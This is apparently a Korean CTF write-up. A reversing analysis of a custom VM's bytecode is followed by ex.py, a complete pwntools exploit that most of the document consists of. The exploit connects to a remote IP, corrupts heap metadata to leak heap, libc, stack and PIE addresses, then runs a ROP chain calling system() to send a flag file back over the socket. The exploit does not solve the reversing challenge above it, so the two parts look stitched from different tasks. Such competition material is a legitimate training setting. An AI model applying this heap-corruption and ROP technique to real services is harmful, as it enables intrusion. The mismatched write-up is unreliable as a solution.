# Rev / Unknown Virt

### 분석

대회 때는 cursor 깔짝대고 안 풀려서 손 안 댔는데, 정연산이 꽤나 쉽고 깔끔하다. 정연산 먼저 파악 후 역연산 짜주면 된다.

정연산 어셈 해석
```
0x0 : reg[0] = 1
0x3 : reg[1] = 2
0x6 : reg[1] <<= 8
0x9 : reg[0] |= reg[1]
0xc : reg[4] = a1[reg[0]]
0xf : reg[5] = 64
0x12 : flag = (reg[4] == reg[5])
0x15 :
    if self.flag != 0 :
        if 0 != 0 : pc = 66
        else : pc = 0x2042
    else : pc += 4
jump
0x19 : reg[3] = reg[4]
0x1c : flag = (reg[3] == reg[5])
0x1f :
    if self.flag != 0 :
        if 0 != 0 : pc = 66
        else : pc = 0x2042
    else : pc += 4
jump
0x23 : reg[0] = 0
0x26 : reg[1] = 0
0x29 : reg[1] <<= 8
0x2c : reg[0] |= reg[1]
0x2f : reg[0] += reg[3]
0x32 : reg[1] = 170
0x35 : a1[reg[0]] = reg[1]
0x38 : reg[0] = 1
0x3b : reg[3] += reg[0]
0x3e :
    if 0 != 0 : pc = 28
    else : pc = 0x201c
jump // input 64 만들기 0xaa 입력함
0x42 : reg[3] = 0
0x45 : flag = (reg[3] == reg[5])
0x48 :
    if self.flag != 0 :
        if 0 != 0 : pc = 211
        else : pc = 0x20d3
    else : pc += 4
jump
0x4c : reg[0] = 0
0x4f : reg[1] = 0
0x52 : reg[1] <<= 8
0x55 : reg[0] |= reg[1]
0x58 : reg[0] += reg[3] // idx
0x5b : reg[6] = a1[reg[0]]  // input[idx]
0x5e : reg[0] = 13
0x61 : reg[1] = reg[3] // idx
0x64 : reg[0] *= reg[1] // 13 * idx
0x67 : reg[1] = 7
0x6a : reg[0] += reg[1] // (13 * idx) + 7
0x6d : reg[1] = 255
0x70 : reg[0] &= reg[1] // ((13 * idx) + 7) & 0xff
0x73 : reg[2] = reg[0]
0x76 : reg[0] = reg[3]
0x79 : reg[1] = 7
0x7c : reg[0] %= reg[1] // (idx % 7)
0x7f : reg[1] = 1
0x82 : reg[0] += reg[1] // (idx % 7) + 1
0x85 : reg[1] = reg[0]
0x88 : reg[0] = reg[6]
0x8b : reg[0] = f1(reg[0], reg[1]) // f1(input[idx], (idx % 7) + 1)
0x8e : reg[0] ^= reg[2] // f1(input[idx], (idx % 7) + 1) ^ (((13 * idx) + 7) & 0xff)
0x91 : reg[1] = 42
0x94 : reg[0] += reg[1] // (f1(input[idx], (idx % 7) + 1) ^ (((13 * idx) + 7) & 0xff)) + 42
0x97 : reg[1] = 255
0x9a : reg[0] &= reg[1] // ((f1(input[idx], (idx % 7) + 1) ^ (((13 * idx) + 7) & 0xff)) + 42) & 0xff
0x9d : reg[1] = 0
0xa0 : reg[2] = 1
0xa3 : reg[2] <<= 8
0xa6 : reg[1] |= reg[2]
0xa9 : reg[1] += reg[3]
0xac : reg[1] = a1[reg[1]]
0xaf : flag = (reg[0] == reg[1])
0xb2 :
    if self.flag == 0 :
        if 0 != 0 : pc = 192
        else : pc = 0x20c0
    else : pc += 4
jump
0xb6 : reg[0] = 1
0xb9 : reg[3] += reg[0]
0xbc :
    if 0 != 0 : pc = 69
    else : pc = 0x2045
jump
0xc0 : reg[0] = 0
0xc3 : reg[1] = 0
0xc6 : reg[2] = 2
0xc9 : reg[2] <<= 8
0xcc : reg[1] |= reg[2]
0xcf : a1[reg[1]] = reg[0]
0xd2 : 0, what?
0xd3 : reg[0] = 1
0xd6 : reg[1] = 0
0xd9 : reg[2] = 2
0xdc : reg[2] <<= 8
0xdf : reg[1] |= reg[2]
0xe2 : a1[reg[1]] = reg[0]
```

`input` 배열을 `0x40` 길이로 만들고 정해진 알고리즘을 적용하여 한 글자씩 비교하는 모습이다.
### ex.py

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    'b *$rebase(0x00000000000171a)',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p2 = remote('16.184.29.60', 1337)
port = int(p2.recvline().split(b' ')[0])

if args.remote:
    p = remote("16.184.29.60", port)
else:
    p = process([binary, str(port)])
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))
l = ELF('./libc.so.6')

#p.interactive()

def recv_data(idx : int, startpoint : int, sz : int, dt : bytes):
    p.sendafter(b'data: ', p16(1) + p16(idx))
    p.send(p32(startpoint) + p32(sz))
    p.send(dt)

def set_info(idx : int, sz : int, dt : bytes):
    p.sendafter(b'data: ', p16(256) + p16(idx))
    p.send(p32(0) + p32(sz))    
    p.send(dt)

def clear_data(idx : int):
    p.sendafter(b'data: ', p16(16) + p16(idx))
    p.send(p32(0) + p32(0))

def get_info(idx : int):
    p.sendafter(b'data: ', p16(4096) + p16(idx))
    p.send(p32(0) + p32(0))
    return p.recvn(0x30)

recv_data(0, 0, 0, b'\x0a')
set_info(0, 0x20, b'\x00' * 0x20)
recv_data(1, 0, 0, b'\x00')
payload = p64(0x10010 + 0x40 + 0x20 + 0x40 + 1) + b'\x00' * 0x38
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0xcf1)
recv_data(0, 0x10028, -0x10028 & 0xffffffff, payload + b'\x00' * (0x10d38 - len(payload)))
sleep(1)
p.send(b'\x00')
set_info(1, 0x20, b'\x00' * 0x20)
clear_data(1)
clear_data(0)
recv_data(2, 0, 0, b'a')
set_info(0, 0, b'a')
set_info(2, 0, b'a')
set_info(1, 0, b'a')
clear_data(1)
recv_data(1, 0xffc8, 1, b'\x21')
recv_data(1, 0xffe8, 1, b'\x41')
heap_base = (u64(get_info(0)[:8]) << 12) - ((0x0000000556f29479 << 12) - 0x556f29459000)
print(hex(heap_base))
set_info(1, 0, b'a')
# payload = p64(0xa01) + b'\x00' * (0xa00 - 8) + p64(0xc91 + 0x40 - 0xa00) 
# recv_data(1, 0x10028, -0x10028 & 0xffffffff, payload + b'\x00' * (0xcc8 - len(payload)))
# sleep(1)
#p.send(b'\x00')
payload = p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
clear_data(0)
l.address = u64(get_info(1)[:8]) - (0x7fd42b62cb20 - 0x7fd42b429000)
print(hex(l.address))
print(hex(l.sym['__environ']))

payload = p64(l.sym['__environ']) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(l.sym['__environ']) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(l.sym['__environ']) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
stack = u64(get_info(0)[:8]) - (0x00007fff0be8f460 - 0x7fff0be8f278)
stack2 = u64(get_info(0)[:8]) - (0x00007ffdc2e8ab70 - 0x7ffdc2e8a9f4)
print(hex(stack))
print(hex(stack2))

payload = p64(stack2) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(stack2) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(stack2) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
fd = u32(get_info(0)[4:8])
print(hex(fd))

payload = p64(stack2 - 0x34) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(stack2 - 0x34) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(stack2 - 0x34) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
pie_base = u64(get_info(0)[8:0x10]) - 0x1e81
print(hex(pie_base))

payload = p64(pie_base + 0x4020) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(pie_base + 0x4020) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(pie_base + 0x4020) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
set_info(0, 0x8, p64(stack))


dup2 = l.sym['dup2']
system = l.sym['system']
binsh = list(l.search(b'/bin/sh\x00'))[0]
pop_rdi = l.address + 0x000000000010f75b
pop_rsi = l.address + 0x0000000000110a4d
pop_rdx_rbx_r12_r13_rbp = l.address + 0x00000000000b503c
ret = l.address + 0x000000000002e81b
payload = p64(ret) + p64(pop_rdi) + p64(stack + 0x100) + p64(system)
payload = payload.ljust(0x100, b'\x00')
payload += f'cat /home/ctf/flag >& {fd}\x00'.encode()
#recv_data(0, 0, len(payload), payload)

p.sendafter(b'data: ', p16(1) + p16(0))
p.send(p32(0) + p32(len(payload)))
p.send(payload)
p.interactive()
#recv_data(2, (-0x40 - 0x20 - 0x40 - 0x8) & 0xffffffff, 0x40+0x20+0x40+0x8, payload)
#clear_data(0)
```
